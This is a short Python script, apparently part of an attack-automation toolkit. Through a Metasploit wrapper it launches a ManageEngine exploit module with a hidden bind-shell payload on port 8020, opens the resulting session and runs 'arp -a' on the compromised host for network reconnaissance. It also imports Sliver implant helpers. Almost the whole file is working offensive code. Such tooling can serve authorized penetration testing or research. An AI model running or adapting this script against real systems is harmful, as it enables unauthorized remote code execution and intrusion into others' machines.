
import asyncio
from test.executor_Beautify import (
    executor_manual_hint,
    executor_sliver_implant_generation,
    console,
    load_config,
    print_welcome_message,
    confirm_action,
    print_status_message
)
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/test/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)

        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="windows/http/manageengine_connectionid_write",
            payload_module_name="windows/shell/bind_hidden_tcp",
            RHOSTS='', RPORT='8020', TARGETURI='/', AHOST='', LPORT='4444',
        )

    metasploit_sessionid = metasploit_executor.select_session()

    confirm_action("Confirm execution of the next step?")
    commands = """
    arp -a

    """
    metasploit_executor.communicate_with_msf_session(input_texts=commands, session_id=metasploit_sessionid)

    print_status_message("Command execution completed!", status="success")

if __name__ == "__main__":
    asyncio.run(main())
